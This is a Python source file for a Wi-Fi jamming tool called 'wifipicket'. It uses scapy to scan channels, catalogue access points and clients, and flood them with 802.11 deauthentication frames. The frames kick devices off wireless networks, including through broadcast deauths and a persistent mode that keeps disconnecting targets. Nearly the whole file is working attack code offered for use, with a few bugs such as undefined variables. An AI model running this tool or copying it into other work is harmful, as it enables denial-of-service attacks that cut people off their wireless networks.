#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os, sys, time, itertools, argparse, traceback, logging
import socket, struct, fcntl # for getting the MAC

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0 # Scapy quiet

from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import signal, SIGINT, SIGUSR1
from datetime import datetime

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # tan
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # yellow

spinner = itertools.cycle(['-', '/', '|', '\\'])
pidfile = "/tmp/wifipicket.pid"
cntfile = "/tmp/wifipicket.count"   # external file to keep track of the number of forced disconnects, so others can see
#killnum = 0 # number of wifi kills performed
killlist= []# clients kicked off the net
chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']   # default b/g/n North American channels
# Broadcast, broadcast, IPv6mcast, multicast
ignore_mac = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '01:80:c2:00:00:00'] # may want to add, mon_MAC so we dont kick ourselves off
# mac sets (starting triade) for spanning tree, spanning tree, broadcast
ignore_mst = ['33:33:00', '33:33:ff', '01:00:5e']
end_channel_hop = False

def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        monitor_on = True
        if not args.interface in monitors:
            start_mon_mode(args.interface)
        return args.interface
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        # Start monitor mode on a wireless interface
        print '['+G+'*'+W+'] Finding the most powerful interface...'
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Isn't wired
                iface = line[:line.find(' ')] # is the interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []

    if len(interfaces) < 1:
        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface

    # Find most powerful interface
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line: # first line in iwlist scan for a new AP
               count += 1
        scanned_aps.append((count, iface))
        print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
    try:
        interface = max(scanned_aps)[1]
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print '['+R+'-'+W+'] Minor error:',e
            print '    Starting monitor mode on '+G+interface+W
            return interface

def start_mon_mode(interface):
    if not args.quiet:
        print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
    try:
        os.system('ip link set %s down' % interface)
        os.system('iw dev %s set type monitor' % interface)
        os.system('ip link set %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'!'+W+'] Could not start monitor mode.')

def remove_mon_iface(interface):
    os.system('ip link set %s down' % interface)
    os.system('iw dev %s set type managed' % interface)
    os.system('ip link set %s up' % interface)

def mon_mac(mon_iface):
    '''
    get MAC
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    if not args.quiet:
        print '['+G+'*'+W+'] '+G+mon_iface+W+' - '+O+mac+W
    return mac

########################################


def channel_hop(mon_iface, args):
    '''
    First time it runs through the channels it stays on each channel for 5 seconds
    in order to populate the deauth list nicely. After that it goes as fast as it can
    '''
    global monchannel, first_pass

    channelNum = 0
    maxChan = 11 if not args.world else 13
    err = None

    while 1:
        if end_channel_hop:
            print '['+G+'x'+W+'] Terminating channel hop thread.'
            return
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum +=1
            if channelNum > maxChan:
                channelNum = 1
                if first_pass:
                    with lock:
                        first_pass = 0
                        print '['+G+'.'+W+'] Discovery done.'
                        for ap in APs:
                            print '['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W
            with lock:
                monchannel = str(channelNum)

            try:
                proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
            except OSError:
                print '['+R+'-'+W+'] Could not execute "iw"'
                os.kill(os.getpid(),SIGINT)
                sys.exit(1)
            for line in proc.communicate()[1].split('\n'):
                if len(line) > 2: # iw dev shouldnt display output unless there's an error
                    print '['+R+'-'+W+'] Channel hopping failed: '+R+line+W
                    if '(-16)' in line: # command failed: Device or resource busy (-16)
                        # attempt some on the fly troubleshooting
                        try:
                            time.sleep(1)
                            ipproc = Popen(['ip', 'link', 'show', mon_iface], stdout=PIPE, stderr=DN)
                        except OSError:
                            print '['+R+'!'+W+'] Could not execute "ip"'
                            os.kill(os.getpid(),SIGINT)
                            sys.exit(1)
                        iplines=ipproc.communicate()[1].split('\n')
                        if len(iplines) == 0 or len(iplines[0])==0:
                            print '['+R+'!'+W+'] Empty response from ip link show '+R+mon_iface+W
                        elif 'state DOWN' not in iplines[0]:
                            print '['+R+'!'+W+'] Unknown response from ip link show '+R+str(mon_iface)+W+" :"+G+"\\n".join(iplines)+W
                        else:
                            print '['+T+'?'+W+'] Interface '+R+str(mon_iface)+W+" is down. Attempting to bring it up..."
                            os.system('ip link set %s up' % mon_iface)
                    #os.kill(os.getpid(),SIGINT)
                    #sys.exit(1)

        #output(monchannel)
        #print '['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\r'
        if not args.quiet:
            sys.stdout.write("\b%s" %spinner.next())
            sys.stdout.flush()
        #if args.channel:
            #time.sleep(.05)
        #    time.sleep(.1)
        #else:
            # For the first channel hop thru, do not deauth
        if first_pass == 1:
            time.sleep(1)
            continue
        time.sleep(0.1) #???

        if not args.dry_run:
            deauth(monchannel)

def deauth(monchannel):
    '''
    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
    multi-APs to one gateway. Constantly scans the clients_APs list and
    starts a thread to deauth each instance
    '''
    global killist #killnum

    pkts = []
    targets = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                # Can't add a RadioTap() layer as the first layer or it's a malformed
                # Association request packet?
                # Append the packets to a new list so we don't have to hog the lock
                # type=0, subtype=12?
                if ch == monchannel:
                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
                    targets.append(x)
    if len(APs) > 0:
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == monchannel:
                        deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.packets:
            args.packets = 1
        for p in pkts:
            send(p, inter=float(args.timeinterval), count=int(args.packets))
        # report the kill
        for x in targets:
            if args.quiet:
                print datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ': Kicked off '+C+x[0]+W+" from "+O+x[1]+W+' ch '+O+monchannel+W
            else:
                print '['+G+'x'+W+'] Kicked off '+C+x[0]+W+" from "+O+x[1]+W+' ch '+O+monchannel+W+' on '+G+datetime.now().strftime("%Y-%m-%d %H:%M:%S")+W
            #killnum+=1
            if not args.persistent:
                with lock:
                    clients_APs.remove(x)
                    killlist.append(x.extend(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                with open(os.path.expanduser(cntfile), "w") as o:
                    print >> o, str(len(killlist))

def stat_handler(sig, frame):
    # print stats, only useful for the quiet mode
    if not args.persistent:
        print '['+G+'*'+W+'] Kills performed so far: '+G+str(len(killlist))+W
    with lock:
        for x in killlist:
            print '['+G+'x'+W+'] Kicked off '+C+x[0]+W+" from "+O+x[1]+W+' ch '+O+x[2]+W+' on '+B+x[3]+W
    print '['+G+'+'+W+'] '+mon_iface+' currently scanning on channel '+G+monchannel+W
    if len(APs) > 0:
        print '      Access Points     ch   ESSID'
    with lock:
        for ap in APs:
            print '['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W
    print ''

def printClient(ca):
    if not args.quiet:
        if len(ca) > 3:
            print '['+T+'C'+W+'] '+C+ca[0]+W+' - '+O+ca[1]+W+' ('+ca[2].rjust(2)+') aka '+T+ca[3]+W
        else:
            print '['+T+'C'+W+'] '+C+ca[0]+W+' - '+O+ca[1]+W+' ('+ca[2]+')'

def cb(pkt):
    '''
    Look for dot11 packets that aren't to or from broadcast address,
    are type 1 or 2 (control, data), and append the addr1 and addr2
    to the list of deauth targets.
    '''
    if args.verbose:
        print '['+R+'v'+W+'] Packet: '+G+pkt.summary()+W
    #return

    global clients_APs, APs
    # We're adding the AP and channel to the deauth list at time of creation rather
    # than updating on the fly in order to avoid costly for loops that require a lock
    if pkt.haslayer(Dot11):
        #print '['+R+'!'+W+'] Dot11 packet: '+pkt.summary()
        if pkt.addr1 and pkt.addr2:
            pkt.addr1 = pkt.addr1.lower()
            pkt.addr2 = pkt.addr2.lower()

            # Filter out all other APs and clients if asked
            if args.accesspoint:
                # track bssid for essid
                if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].info in args.accesspoint:
                    args.accesspoint.add(pkt[Dot11].addr3.lower())
                # bail if bssid is not in target list
                if not args.accesspoint.intersection([pkt.addr1.lower(), pkt.addr2.lower()]):
                    # pkt does not match our target list
                    return

            #if args.skip:
            #    if pkt.addr2 in args.skip:
            #        return

            # Check if it's added to our AP list
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel, args.world)

            # Ignore all the noisy packets like spanning tree. This if should be after the AP_add as it filters out Dot11Beacon announcements to the braodcast
            if pkt.addr1 in ignore_mac or pkt.addr2 in ignore_mac or pkt.addr1[:8] in ignore_mst or pkt.addr2[:8] in ignore_mst:
                if args.verbose:
                    print '['+R+'v'+W+'] Packet ignored: '+T+pkt.summary()+W
                return

            # Management = 1, data = 2
            #if pkt.type in [1, 2]:
            clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)
    elif args.verbose:
        print '['+R+'v'+W+'] Not a Dot11 packet: '+R+pkt.summary()+W

def APs_add(clients_APs, APs, pkt, chan_arg, world_arg):
    if not pkt.haslayer(Dot11Elt):
        print '['+R+'!'+W+'] Broken packet, no Dot11Elt: '+R+pkt.summary()+W
        return
    ssid = pkt[Dot11Elt].info
    bssid= pkt[Dot11].addr3.lower()
    if args.verbose:
        print '['+T+'v'+W+'] APs add: '+T+str(bssid)+W+" or "+G+str(ssid)+W

    try:
        # Thanks to airoscapy for below
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        if ap_channel not in chans:
            print '['+R+'!'+W+'] Channel '+str(ap_channel)+' is not in the list. Pkt: '+T+pkt.summary()+W
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception as e:
        #raise
        return

    if len(APs) == 0:
        with lock:
            if not args.quiet:
                print '['+T+'A'+W+'] '+O+bssid+W+' ch '+ap_channel.rjust(2)+' aka '+T+ssid+W
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            if not args.quiet:
                print '['+T+'A'+W+'] '+O+bssid+W+' ch '+ap_channel.rjust(2)+' aka '+T+ssid+W
            return APs.append([bssid, ap_channel, ssid])

def clients_APs_add(clients_APs, addr1, addr2):
    if args.verbose:
        print '['+R+'v'+W+'] Client <-> AP: '+G+str(addr1)+W+" -> "+T+str(addr2)+W

    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                printClient([addr1, addr2, monchannel])
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            return AP_check(addr1, addr2)

    # Append new clients/APs if they're not in the list
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            #output(monchannel)
            with lock:
                printClient([addr1, addr2, monchannel])
                return clients_APs.append([addr1, addr2, monchannel])

def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                printClient([addr1, addr2, ap[1], ap[2]])
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])

def ctrlc_handler(signal, frame):
    global end_channel_hop
    end_channel_hop=True
    os.remove(os.path.expanduser(pidfile))
    if monitor_on:
        sys.exit('\n['+R+'!'+W+'] Stop. Closing without stopping monitoring')
    else:
        remove_mon_iface(mon_iface)
        #os.system('service network-manager restart')
        sys.exit('\n['+R+'!'+W+'] Stop. Switching monitoring off and closing')

if __name__ == "__main__":
    if os.geteuid():
        sys.exit('['+R+'-'+W+'] Please run as root')

    #Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",
                        help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
    parser.add_argument("-c","--channel",
                        help="Listen on and deauth only clients on the specified channel. Example: -c 6")
    parser.add_argument("-t","--timeinterval",
                        help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
    parser.add_argument("-p","--packets",
                        help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
    parser.add_argument("-d","--directedonly",action='store_true',
                        help="Skip the deauthentication packets to the broadcast address of the access points and only send them to client/AP pairs")
    parser.add_argument("-a","--accesspoint",nargs='*',default=[],
                        help="Enter the SSID or MAC addresses of a specific access points to target. SSID will match multiple APs if they share the same SSID")
    parser.add_argument("-m","--mac",nargs='*',default=[],
                        help="Limit to specific MACs through BPF (pcap-filter). Can provide many separated by space. Can be combined with -a to target specific clients on specific APs.")
    parser.add_argument("-s","--skip",nargs='*',default=[],
                        help="Skip deauthing these MAC addresses. Example: -s 00:11:BB:33:44:AA")
    parser.add_argument("-q","--quiet",action='store_true',
                        help="Be silent. To show status do sudo kill -USR1 $(cat "+pidfile+")")
    parser.add_argument("-v","--verbose",action='store_true',
                        help="Print packets and other debug stuff")
    parser.add_argument("--wide",action="store_true",
                        help="Enable scanning of 13 channels in the N range. By default North American standard of 11 channels is used")
    parser.add_argument("--ac",action="store_true",
                        help="Add 802.11ac North American 5Ghz channels to the scan list. Please note that it may include channels not allowed in other parts of the world. Check wikipedia's 'List of WLAN channels'.")
    parser.add_argument("--persistent",default=False,action='store_true',
                        help="Keep disconnecting the client even if it is no longer connected.")
    parser.add_argument("--dry-run",action='store_true',
                        help="Do not deauth anyone, just monitor and report")
    args=parser.parse_args()

    # create the PID file
    if os.access(os.path.expanduser(pidfile), os.F_OK):
        #if the lockfile is already there then check the PID number in the lock file
        pidfilehandle = open(os.path.expanduser(pidfile), "r")
        #pidfilehandle.seek(0)
        ppid = pidfilehandle.readline()
        # Now we check the PID from lock file matches to the current process PID
        if os.path.exists("/proc/%s" % ppid):
            print sys.argv[0] + " is already running. "
            sys.exit(1)
        else:
            print pidfile+' file is there but '+sys.argv[0]+' is not running. Removing the stale lock file.'
            os.remove(os.path.expanduser(pidfile))
    file(pidfile, 'w').write(str(os.getpid()))

    with open(os.path.expanduser(cntfile), "w") as o:
        print >> o, str(len(killlist))

    clients_APs = []
    APs = []
    DN = open(os.devnull, 'w')
    lock = Lock()
    if args.quiet:
        W=R=G=O=B=P=C=GR=T=""
    # lowercase bssids while leaving essids intact
    args.accesspoint = set(_.lower() if ':' in _ else _ for _ in args.accesspoint)
    args.mac = set(_.lower() for _ in args.mac)
    # build the bpf
    # leave only Management = 1, data = 2 packets: pkt.type in [1, 2]:
    bpf='(not type ctl) and (not type mgt subtype deauth)'
    if len(args.mac):
        # even with sniffing limited to specific MACs we will get the AP beacons/announcements since they go to the broadcast MACs
        bpf+=' and (wlan host %s) ' % ' or '.join(args.mac)
    #bpf='type mgt'
    print '['+R+'*'+W+'] Packet filter: '+C+bpf+W
    monitor_on = None
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1
    if args.wide:
        chans += ['12', '13'] # b/g/n World channels
    if args.ac:
        chans += ['36', '38', '40', '42', '44', '46', '48'] # open channels
        chans += ['50', '52', '54', '56', '58', '60', '62', '64', '100', '102', '104', '106', '108', '110', '112', '114', '116', '118', '120', '122', '124', '126', '128', '132', '134', '136', '138', '140', '142', '144'] # DFS channels
        chans += ['149', '151', '153', '155', '155', '157', '159', '161', '165'] # open channels
    if args.skip:
        ignore += [addr.lower() for addr in args.skip] # += is 'extend'. list comprehension can also done as list(map(str.lower, args.skip))

    # Start channel hopping
    hop = Thread(target=channel_hop, args=(mon_iface, args))
    hop.daemon = True
    hop.start()

    signal(SIGINT, ctrlc_handler)
    signal(SIGUSR1,stat_handler) # currently does not work with the BPF specified, cause sniff can be stuck in the select call filtering for the packets and SIGUSR1 will intrude in it causing the exception

    retry=3
    while retry:
        try:
            sniff(iface=mon_iface, store=0, prn=cb, filter=bpf)
        except Exception as msg:
            print '['+R+'!'+W+'] Exception while sniffing. '+R+str(msg)+W+':'+str(sys.exc_info()[0])
            traceback.print_exc(file=sys.stdout)
        finally:
            time.sleep(2)
            retry-=1
            print '['+R+'!'+W+'] '+str(retry)+' attempts left.'

    print '['+R+'!'+W+'] Shutting down.'
    os.remove(os.path.expanduser(pidfile))
    remove_mon_iface(mon_iface)
    #os.system('service network-manager restart')
    sys.exit(0)
